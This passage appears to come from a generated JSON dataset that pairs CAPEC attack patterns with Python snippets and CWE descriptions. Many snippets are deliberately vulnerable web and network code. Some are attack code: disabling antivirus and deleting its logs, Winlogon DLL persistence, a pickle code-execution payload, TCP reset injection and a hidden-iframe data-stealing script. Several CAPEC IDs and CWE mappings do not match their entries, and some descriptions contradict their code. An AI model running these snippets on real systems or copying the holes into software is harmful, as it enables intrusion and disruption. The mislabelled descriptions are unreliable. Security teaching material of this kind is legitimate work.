        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Artificially Inflate File Sizes'. It includes: 1) CWE-774: Allocating a large number of file descriptors without limits, potentially leading to a Denial of Service (DoS). 2) CWE-434: Uploading a dangerous file type (e.g., an executable). 3) CWE-646: Relying on the file extension to determine file type, which can be misleading. 4) CWE-409: Handling a large amount of decompressed data, which can lead to resource exhaustion. 5) CWE-69: Using Windows Alternate Data Streams (ADS) to hide data. These examples illustrate how an adversary might inflate file sizes or misuse file handling to cause various security issues."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running processes\n# This function exposes sensitive information about the system's processes\n# to any user who can execute this script\n\ndef get_running_processes():\n    processes = os.popen('ps aux').read()\n    return processes\n\n# Main function to print the running processes\nif __name__ == '__main__':\n    print(get_running_processes())",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Process Footprinting' (CAPEC-169). The function `get_running_processes` uses the `os.popen` method to execute the 'ps aux' command, which retrieves a list of all running processes on the system. This information is then returned as a string. When the script is executed, it prints the list of running processes to the console. This exposes sensitive system information (CWE-200, CWE-497) to any user who can run the script, potentially including unauthorized users. The code does not implement any access control or authorization checks, making it easy for an adversary to gain insights into the target environment, which could be used for further malicious activities."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running services\n# This function exposes sensitive system information to unauthorized users\n# CWE-200, CWE-497\n\ndef get_running_services():\n    try:\n        services = os.popen('tasklist /svc').read()\n        return services\n    except Exception as e:\n        return str(e)\n\n# Function to print running services\n# CWE-214: Sensitive information is printed to the console\n\ndef print_services():\n    services = get_running_services()\n    print(services)\n\n# Main function\nif __name__ == '__main__':\n    print_services()",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Services Footprinting' (CAPEC-309). The `get_running_services` function uses the `os.popen` method to execute the 'tasklist /svc' command, which retrieves a list of running services on the system. This information is sensitive and should not be exposed to unauthorized users (CWE-200, CWE-497). The `print_services` function then prints this sensitive information to the console, making it visible to any user with access to the console (CWE-214). This code represents how an adversary could exploit functionality meant for authorized users to gain insights into the target system's services, potentially leading to further malicious actions."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import os\n\n# Function to get user information\n# This function exposes sensitive information to unauthorized users\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_user_info():\n    # Using os.popen to execute a system command that lists all users\n    # CWE-214: Invocation of Process Using Visible Sensitive Information\n    user_info = os.popen('net user').read()\n    return user_info\n\n# Function to print user information\n# This could be accessed by unauthorized users\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\ndef print_user_info():\n    info = get_user_info()\n    print(info)\n\n# Main function to demonstrate the vulnerability\ndef main():\n    print_user_info()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Account Footprinting' (CAPEC-). The `get_user_info` function uses the `os.popen` method to execute the 'net user' command, which retrieves information about all user accounts on a Windows system. This information is then printed by the `print_user_info` function. The code embodies several CWEs: CWE-200 and CWE-497 by exposing sensitive user information to potentially unauthorized actors, CWE-214 by invoking a process with visible sensitive information, and CWE-529 by potentially exposing access control list files to unauthorized control spheres. The main idea is to show how an adversary could exploit such functionality to gather information about domain accounts and their permissions, which could be used for further malicious activities."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import os\n\n# Function to list all groups and their members\n# This function exposes sensitive information to unauthorized users\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\ndef list_groups():\n    groups = os.popen('net localgroup').read()\n    return groups\n\n# Function to add a user to a group\n# CWE-842: Placement of User into Incorrect Group\ndef add_user_to_group(user, group):\n    os.system(f'net localgroup {group} {user} /add')\n\n# Example usage\nif __name__ == '__main__':\n    # Expose all groups and their members\n    print(list_groups())\n    \n    # Add a user to a group (potentially incorrect group)\n    add_user_to_group('exampleUser', 'Administrators')",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit group permission footprinting. The `list_groups` function uses the `net localgroup` command to list all groups and their members on a Windows system, exposing sensitive information (CWE-200, CWE-529). The `add_user_to_group` function adds a user to a specified group, which could lead to placing a user into an incorrect group (CWE-842). This code represents the main idea of CAPEC-Group Permission Footprinting by showing how an adversary can gather information about user groups and manipulate group memberships to further their malicious activities."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to get the last modified time of a file\n# This simulates the 'dir /A ntuser.dat' command on Windows\n# and exposes sensitive information about user activity\n\ndef get_last_modified_time(file_path):\n    try:\n        # Check if the file exists\n        if os.path.exists(file_path):\n            # Get the last modified time\n            last_modified_time = os.path.getmtime(file_path)\n            # Convert to human-readable format\n            readable_time = time.ctime(last_modified_time)\n            return readable_time\n        else:\n            return \"File does not exist.\"\n    except Exception as e:\n        return str(e)\n\n# Example usage\nfile_path = 'C:\\Users\\example_user\\ntuser.dat'\nprint(f\"Last modified time of {file_path}: {get_last_modified_time(file_path)}\")",
        "description": "This Python code snippet demonstrates how to retrieve the last modified time of a file, specifically 'ntuser.dat', which is indicative of the last login time of a user on a Windows system. The function 'get_last_modified_time' checks if the file exists and then retrieves and formats the last modified time. This simulates the 'dir /A ntuser.dat' command mentioned in the CAPEC description. The code embodies the main idea of 'Owner Footprinting' by exposing sensitive information about user activity. The related CWEs are represented by the potential exposure of sensitive information (CWE-200, CWE-497) and the invocation of a process that could reveal sensitive details (CWE-214)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nadmin_password = 'hardcoded_password'\n\n# Function to disable security software\n# CWE-284: Improper Access Control\n# CWE-671: Lack of Administrator Control over Security\n# CWE-1037 & CWE-733: Potential issues with optimization removing security-critical code\n\ndef disable_security_software(password):\n    if password == admin_password:\n        try:\n            # Attempt to kill a security process (e.g., antivirus)\n            subprocess.run(['taskkill', '/F', '/IM', 'antivirus.exe'], check=True)\n            # Attempt to delete a registry key to prevent security software from starting\n            os.system('reg delete HKLM\\Software\\SecuritySoftware /f')\n            # Attempt to delete log files\n            os.remove('C:\\SecuritySoftware\\logs\\logfile.log')\n            print('Security software disabled.')\n        except Exception as e:\n            print(f'Failed to disable security software: {e}')\n    else:\n        print('Invalid password.')\n\n# Example usage\n# This would be an unauthorized attempt to disable security software\n# In a real scenario, this should be protected by proper access control mechanisms\ndisable_security_software('hardcoded_password')",
        "description": "This Python code snippet demonstrates a vulnerable implementation that disables security software by exploiting improper access control (CWE-284) and using hard-coded credentials (CWE-798). The function `disable_security_software` takes a password as input and, if it matches the hard-coded admin password, attempts to kill a security process, delete a registry key, and remove log files. This represents the CAPEC 'Disable Security Software' by showing how an adversary could disable security tools to avoid detection. The code also highlights potential issues with lack of administrator control over security settings (CWE-671) and the risk of security-critical code being removed or modified by processor or compiler optimizations (CWE-1037 & CWE-733)."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import winreg\n\n# Vulnerable code: Modifying Winlogon registry key to load a malicious DLL\ntry:\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, 'C:\\malicious.dll')\n    winreg.CloseKey(key)\n    print('Registry key modified successfully.')\nexcept Exception as e:\n    print(f'Failed to modify registry key: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where the Winlogon registry key is modified to load a malicious DLL at startup. The code opens the Winlogon registry key and sets the 'Userinit' value to a path of a malicious DLL. This embodies the CAPEC 'Replace Winlogon Helper DLL' by showing how an adversary can exploit this feature to load adversarial code at startup. The related CWEs provide additional context: CWE-15 (External Control of System or Configuration Setting) is represented by the ability to modify the registry key, CWE-427 (Uncontrolled Search Path Element) is implied by the potential for the DLL path to be controlled by an attacker, and CWE-798 (Use of Hard-coded Credentials) is indirectly related as the path to the malicious DLL is hard-coded in the script."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to simulate a login process\ndef login(username, password):\n    # Simulate checking username\n    if username == 'admin':\n        time.sleep(0.5)  # Simulate time delay for valid user\n        if password == 'password123':\n            return 'Login successful'\n        else:\n            return 'Invalid password'\n    else:\n        time.sleep(0.1)  # Simulate time delay for invalid user\n        return 'Invalid username'\n\n# Function to simulate system information exposure\ndef get_system_info():\n    if os.path.exists('/etc/passwd'):\n        with open('/etc/passwd', 'r') as f:\n            return f.read()\n    return 'System information not available'\n\n# Example usage\nprint(login('admin', 'password123'))\nprint(get_system_info())",
        "description": "This Python code snippet demonstrates vulnerabilities related to the CAPEC 'System Footprinting' and associated CWEs. The `login` function simulates a login process with observable timing discrepancies (CWE-208) based on whether the username is valid or not. This can reveal information about valid usernames to an attacker. The `get_system_info` function exposes sensitive system information (CWE-497) by reading the contents of '/etc/passwd', which should not be accessible to unauthorized users. Together, these functions illustrate how an adversary can probe a system to gather security-relevant information."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport subprocess\n\n# Function to list installed security software\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-512: Spyware\n# CWE-507: Trojan Horse\n\ndef list_security_software():\n    try:\n        # Example command to list installed software (platform dependent)\n        installed_software = subprocess.check_output(['wmic', 'product', 'get', 'name'], shell=True)\n        installed_software = installed_software.decode('utf-8')\n        \n        # Filter for known security software (simplified example)\n        security_software = [line for line in installed_software.split('\\n') if 'Security' in line or 'Antivirus' in line]\n        \n        # CWE-512: Collecting information without user consent\n        # CWE-507: Hidden functionality to exfiltrate data\n        with open('security_software_list.txt', 'w') as file:\n            for software in security_software:\n                file.write(software + '\\n')\n\n        # CWE-1395: Using a potentially vulnerable third-party component (e.g., subprocess)\n        # CWE-497: Exposing sensitive information\n        print('Security software list saved to security_software_list.txt')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\nlist_security_software()",
        "description": "This Python code snippet demonstrates a function that lists installed security software on a system. It uses the 'wmic' command to get a list of installed products and filters for known security software. The results are saved to a file named 'security_software_list.txt'. This code embodies the concept of 'Security Software Footprinting' (CAPEC) by attempting to gather information about installed security tools. It also touches on several related CWEs: CWE-497 by potentially exposing sensitive system information, CWE-1395 by depending on a third-party component (subprocess) that could be vulnerable, CWE-512 by collecting information without user consent, and CWE-507 by hiding the functionality of exfiltrating data to a file."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import socket\nimport threading\n\n# Simulate a network route disabling attack\nclass RouteDisabler:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.running = False\n\n    def start(self):\n        self.running = True\n        self.thread = threading.Thread(target=self.disable_route)\n        self.thread.start()\n\n    def disable_route(self):\n        while self.running:\n            try:\n                # Create a socket to disrupt the communication\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((self.target_ip, self.target_port))\n                s.shutdown(socket.SHUT_RDWR)\n                s.close()\n            except Exception as e:\n                pass\n\n    def stop(self):\n        self.running = False\n        self.thread.join()\n\n# Example usage\nif __name__ == '__main__':\n    disabler = RouteDisabler('192.168.1.10', 8080)\n    disabler.start()\n    # Let it run for a while to simulate the attack\n    import time\n    time.sleep(10)\n    disabler.stop()",
        "description": "This Python code snippet simulates a network route disabling attack, embodying the main idea of CAPEC-Route Disabling. The 'RouteDisabler' class targets a specific IP and port, repeatedly attempting to disrupt the communication channel by creating and shutting down sockets. This represents the attack pattern of severing the communication route between two entities. The related CWEs are reflected in the context of improper enforcement of message integrity, unauthorized error injection, and incorrect specification of communication channels, as the code does not ensure the integrity or correctness of the communication endpoints and disrupts the channel."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import os\nimport time\n\n# Simulate disabling network hardware by shutting down network interface\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\n# Function to disable network interface\n# This is a vulnerable function as it does not check for proper authorization\n# and can be called by any user with script execution permissions\n\ndef disable_network_interface(interface):\n    # CWE-1256: Improper restriction of software interfaces to hardware features\n    os.system(f'sudo ifconfig {interface} down')\n    time.sleep(5)  # Simulate downtime\n    os.system(f'sudo ifconfig {interface} up')\n\n# Example usage\n# This would disable the 'eth0' network interface\n# In a real-world scenario, this could be exploited by an adversary to disrupt network services\n\nif __name__ == '__main__':\n    disable_network_interface('eth0')",
        "description": "This Python code snippet demonstrates a vulnerable function that disables a network interface, embodying the main idea of the CAPEC 'Disabling Network Hardware'. The function 'disable_network_interface' takes an interface name as an argument and uses the 'os.system' call to bring the interface down and then back up after a delay. This represents CWE-1256 as it improperly restricts software interfaces to hardware features, allowing unauthorized users to disable network hardware. Additionally, it does not preserve the integrity of the hardware configuration state (CWE-1304) and lacks protection for outbound error messages and alert signals (CWE-1320), making it susceptible to exploitation by adversaries to disrupt network services."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import socket\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n\n# Simulate BGP Route Disabling by sending incorrect BGP update messages\n\n# BGP message structure (simplified)\nBGP_UPDATE_MSG = b'\\x00\\x00\\x00\\x13\\x01\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Create a socket to simulate BGP communication\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a BGP peer (incorrectly specified destination)\nsock.connect(('192.0.2.1', 179))  # CWE-941\n\n# Send a BGP update message with incorrect route information\nsock.send(BGP_UPDATE_MSG)  # CWE-924\n\n# Close the socket\nsock.close()\n\nprint(\"BGP route update sent to disable route.\")",
        "description": "This Python code snippet simulates a BGP Route Disabling attack by sending an incorrect BGP update message to a BGP peer. The code demonstrates CWE-941 by connecting to an incorrectly specified destination, CWE-924 by not ensuring the integrity of the BGP message during transmission, and CWE-757 by not using a secure algorithm for the communication. The main idea is to disrupt the BGP routing by sending incorrect route information, which can render the underlying network inaccessible."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef is_trusted_domain(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        trusted_domains = ['trusted.com', 'secure.org']\n        return any(hostname.endswith(domain) for domain in trusted_domains)\n    except socket.herror:\n        return False\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(user_input_url):\n    if is_trusted_domain(user_input_url):\n        return f\"Redirecting to {user_input_url}\"\n    else:\n        return \"Untrusted domain. Redirection blocked.\"\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return f\"<html><body>{user_input}</body></html>\"\n\n# Example usage\nuser_ip = '192.0.2.1'\nuser_url = 'http://untrusted.com/malicious'\nuser_input = '<script>alert(\"XSS\")</script>'\n\nprint(redirect_user(user_url))\nprint(generate_web_page(user_input))",
        "description": "This Python code snippet demonstrates vulnerabilities related to DNS Domain Seizure and associated CWEs. The `is_trusted_domain` function performs reverse DNS resolution (CWE-350) to check if an IP address belongs to a trusted domain, but it does not ensure the IP address is truly associated with the hostname. The `redirect_user` function uses this check to decide whether to redirect a user to a given URL, potentially leading to open redirect vulnerabilities (CWE-601). The `generate_web_page` function improperly neutralizes user input, making it susceptible to cross-site scripting (CWE-79). This code represents the main idea of DNS Domain Seizure by showing how improper handling of DNS and user inputs can lead to security issues."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\n\nclass SensitiveData:\n    def __init__(self, secret):\n        self.secret = secret\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        import os\n        return (os.system, ('echo Malicious Code Executed',))\n\n# Simulate deserialization of untrusted data\nserialized_data = pickle.dumps(MaliciousPayload())\n\n# Vulnerable deserialization\ntry:\n    deserialized_object = pickle.loads(serialized_data)\nexcept Exception as e:\n    print(f'Error during deserialization: {e}')\n\n# Sensitive data class\nsensitive = SensitiveData('TopSecret')\n\n# Serialize sensitive data\nserialized_sensitive = pickle.dumps(sensitive)\n\n# Deserialize sensitive data\ntry:\n    deserialized_sensitive = pickle.loads(serialized_sensitive)\n    print(f'Sensitive data: {deserialized_sensitive.secret}')\nexcept Exception as e:\n    print(f'Error during deserialization: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable deserialization process using the `pickle` module. The `MaliciousPayload` class is designed to exploit the deserialization process by executing a system command when deserialized. The `SensitiveData` class contains sensitive information that can be serialized and deserialized without proper security measures. The code highlights the risks associated with deserializing untrusted data, which can lead to remote code execution and exposure of sensitive information. This example embodies the main idea of the CAPEC by showing how an adversary can inject malicious content during the deserialization process, leveraging related CWEs such as deserialization of untrusted data (CWE-502) and serializable class containing sensitive data (CWE-499)."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head>\n    <title>Vulnerable Page</title>\n</head>\n<body>\n    <h1>Welcome to the vulnerable page</h1>\n    <iframe src=\"https://legitimate-site.com\" style=\"display:none;\"></iframe>\n    <script>\n        // Malicious JavaScript interacting with the hidden iframe\n        var iframe = document.querySelector('iframe');\n        iframe.onload = function() {\n            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n            var sensitiveData = iframeDoc.getElementById('sensitive-data').innerText;\n            alert('Stolen Data: ' + sensitiveData);\n        };\n    </script>\n</body>\n</html>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses Flask to create a simple web application that demonstrates a Cross Frame Scripting (XFS) attack. The main page includes an iframe that loads a legitimate site, which is hidden from the user's view. Malicious JavaScript is used to interact with the hidden iframe and extract sensitive data from it. This example embodies the CAPEC by combining a legitimate webpage with malicious JavaScript, leveraging social engineering to convince the user to visit the attacker's page. The code also touches on related CWEs by improperly restricting frame objects (CWE-1021) and potentially allowing cross-site scripting (CWE-79) through the use of unneutralized input."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_input = request.args.get('input', '')\n    # Vulnerable to DOM-Based XSS\n    template = f\"<html><body><script>var user_input = '{user_input}'; document.write(user_input);</script></body></html>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that is vulnerable to DOM-Based XSS attacks. The application takes user input from a query parameter 'input' and directly inserts it into a JavaScript context within the HTML template without proper validation or encoding. This allows an attacker to inject malicious scripts that will be executed in the client's browser when the page is loaded. The code demonstrates several CWE weaknesses: CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\n\n# Vulnerable DNS request function\n\ndef vulnerable_dns_request(domain):\n    try:\n        # CWE-1327: Binding to an unrestricted IP address\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.bind(('0.0.0.0', 0))\n\n        # Constructing a DNS request\n        dns_request = construct_dns_request(domain)\n\n        # CWE-300: Channel accessible by non-endpoint\n        sock.sendto(dns_request, ('8.8.8.8', 53))\n\n        # CWE-291: Reliance on IP address for authentication\n        response, _ = sock.recvfrom(512)\n        ip_address = parse_dns_response(response)\n\n        # CWE-350: Reliance on reverse DNS resolution for a security-critical action\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        if hostname == domain:\n            print(f\"Domain {domain} resolved to {ip_address}\")\n        else:\n            print(\"DNS spoofing detected!\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Helper functions (simplified for brevity)\ndef construct_dns_request(domain):\n    # Simplified DNS request construction\n    return b'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00' + domain.encode() + b'\\x00\\x00\\x01\\x00\\x01'\n\ndef parse_dns_response(response):\n    # Simplified DNS response parsing\n    return '192.0.2.1'\n\n# Example usage\nvulnerable_dns_request('example.com')",
        "description": "This Python code snippet demonstrates a vulnerable DNS request function that embodies the main idea of CAPEC-147: DNS Blocking. The function sends a DNS request to a public DNS server (8.8.8.8) and processes the response. The code includes several weaknesses:\n\n1. CWE-1327: The socket binds to an unrestricted IP address (0.0.0.0), making it accessible from any network interface.\n2. CWE-300: The DNS request is sent over a channel that can be intercepted by non-endpoints, allowing an adversary to drop or manipulate the request.\n3. CWE-291: The code relies on the IP address for authentication, assuming the response is legitimate without further verification.\n4. CWE-350: The code performs reverse DNS resolution to verify the hostname, but does not ensure the IP address is truly associated with the hostname, making it susceptible to DNS spoofing.\n\nThe code represents the idea of DNS Blocking by showing how an adversary could intercept and manipulate DNS requests, denying access to specific services or content."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import socket\n\n# Vulnerable server binding to an unrestricted IP address\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server listening on 0.0.0.0:8080')\n\nwhile True:\n    client_socket, client_address = server_socket.accept()\n    print(f'Connection from {client_address}')\n    # Reliance on IP address for authentication\n    if client_address[0] == '192.168.1.100':\n        client_socket.send(b'Authenticated')\n    else:\n        client_socket.send(b'Access Denied')\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server that binds to an unrestricted IP address (0.0.0.0) and relies on the client's IP address for authentication. The server listens for incoming connections on port 8080 and checks the client's IP address to determine if they are authenticated. If the client's IP address is '192.168.1.100', they are considered authenticated; otherwise, access is denied. This setup is vulnerable to IP address blocking attacks, where an adversary can drop packets destined for the target IP address to prevent access to the service. Additionally, the code embodies several related CWEs: binding to an unrestricted IP address (CWE-1327), reliance on IP address for authentication (CWE-291), and improper restriction of communication channel to intended endpoints (CWE-923)."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    # Vulnerable to Reflected XSS\n    return f'<html><body>Search results for: {query}</body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Reflected Cross-Site Scripting (XSS). The application has a single route '/search' that takes a query parameter 'q' from the URL. The value of 'q' is directly inserted into the HTML response without any form of input neutralization or sanitization. This makes the application susceptible to XSS attacks, as an attacker can craft a URL with a malicious script in the 'q' parameter, which will be reflected back to the victim's browser and executed. This example embodies the main idea of CAPEC-86 (Reflected XSS) and highlights CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags), CWE-692 (Incomplete Denylist to Cross-Site Scripting), CWE-84 (Improper Neutralization of Encoded URI Schemes), and CWE-81 (Improper Neutralization of Script in an Error Message Web Page)."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Simulated database\ncomments = []\n\n@app.route('/submit', methods=['POST'])\ndef submit_comment():\n    comment = request.form['comment']\n    # Vulnerable to Stored XSS\n    comments.append(comment)\n    return 'Comment submitted!'\n\n@app.route('/view')\ndef view_comments():\n    # Render comments without proper sanitization\n    comments_html = ''.join(f'<p>{comment}</p>' for comment in comments)\n    return render_template_string(f'<html><body>{comments_html}</body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Stored Cross-Site Scripting (XSS). The application has two routes: '/submit' for submitting comments and '/view' for viewing them. The comments are stored in a list and rendered directly in the HTML without proper sanitization. This allows an attacker to submit a comment containing malicious scripts, which will be stored and executed when other users view the comments. The code embodies the main idea of CAPEC-63 (Stored XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "from flask import Flask, session, redirect, url_for, request\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Improper Authentication: No actual verification of credentials\n    if username == 'admin' and password == 'password':\n        session['user'] = username\n        return redirect(url_for('dashboard'))\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return f'Welcome {session['user']}!'\n    return redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout():\n    session.pop('user', None)\n    return redirect(url_for('login'))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple Flask web application with a login mechanism that is vulnerable to session hijacking. The code demonstrates several weaknesses related to the CAPEC description of session hijacking:\n\n1. **Improper Authentication (CWE-287)**: The login function does not properly verify user credentials, allowing any user with the correct username and password to log in without additional checks.\n\n2. **Session Fixation (CWE-384)**: The application does not invalidate existing session identifiers upon login, which could allow an attacker to reuse an old session ID to gain unauthorized access.\n\n3. **Insufficient Session Expiration (CWE-613)**: The session does not have an expiration mechanism, allowing sessions to remain valid indefinitely unless explicitly logged out.\n\n4. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The application relies on the client to manage session state without additional server-side validation.\n\nThis code snippet embodies the main idea of session hijacking by demonstrating how weak session management and improper authentication can lead to unauthorized access to an application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        # Process data without verifying the source or integrity\n        print(f'Received data: {data.decode()}')\n        # Echo the data back to the client\n        client_socket.send(data)\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to traffic injection attacks. The server accepts incoming connections and processes data without verifying the source or ensuring the integrity of the messages. This lack of verification and integrity checking makes it susceptible to traffic injection, where an adversary can inject malicious traffic to degrade, disrupt, or modify the communication. The code also transmits data in cleartext, which can be sniffed by unauthorized actors, further exposing sensitive information."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport struct\n\n# Function to create a TCP reset packet\ndef create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             src_port, dst_port, seq_num, 0, 80, 4, 0, 0, 0)\n    return ip_header + tcp_header\n\n# Function to send the reset packet\ndef send_reset_packet(packet, dst_ip):\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n    s.sendto(packet, (dst_ip, 0))\n\n# Example usage\nsrc_ip = '192.168.1.2'\nsrc_port = 12345\ndst_ip = '192.168.1.3'\ndst_port = 80\nseq_num = 1000\n\nreset_packet = create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num)\nsend_reset_packet(reset_packet, dst_ip)",
        "description": "This Python code snippet demonstrates how an attacker might inject a TCP reset packet to disrupt a connection between two endpoints. The `create_reset_packet` function constructs a TCP reset packet using the provided source and destination IP addresses and ports, along with a sequence number. The `send_reset_packet` function sends this packet to the destination IP using a raw socket. This embodies the CAPEC 'Connection Reset' attack pattern by showing how an attacker can sever a connection without directly filtering the traffic. The code also touches on related CWEs, such as 'Improper Verification of Source of a Communication Channel' (CWE-940) and 'Improper Enforcement of Message Integrity During Transmission in a Communication Channel' (CWE-924), by not verifying the source or integrity of the packet."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
